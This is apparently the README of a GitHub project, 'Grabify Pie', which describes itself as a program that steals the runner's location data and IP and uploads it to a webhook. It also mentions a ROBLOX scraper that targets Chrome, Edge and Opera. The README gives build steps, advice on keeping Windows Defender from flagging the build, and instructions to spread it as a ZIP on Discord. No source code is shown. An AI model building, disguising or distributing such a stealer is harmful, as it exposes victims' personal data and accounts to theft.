# Grabify Pie

A simple program to steal your information and upload it to a webhook.

> DO NOT, AND I REPEAT; DO NOT RUN THIS PROGRAM
> AT IT'S BASE DEFAULTS. BY DOING SO YOU GIVE WHOEVER IS IN MY TESTING SERVER
> FULL ACCESS TO YOUR INFORMATION INCLUDING STATE, CITY, IP, TIMEZONE, AND
> CONTINENT. YOU HAVE BEEN WARNED

## Disclaimer

You MUST build this without `-F` since `-F` packages every library which causes
Windows Defender to get angry at you. And every other service.

This was tested on discord, you must add the `<DISTPATH>` to a ZIP file and distribute it that way.

## Build Instructions (Windows)

To build this program, you need to create an `output-bins` directory, then execute `.\build.ps1`.

## (NOTE) For ROBLOX Scraper

It currently only supports `chrome/chromium`, `msedge`, and `opera`. Other browsers are currently not being looked at, but if you would like to request support for your browser, please [file an issue.](https://github.com/thekaigonzalez/grabifyPie/issues)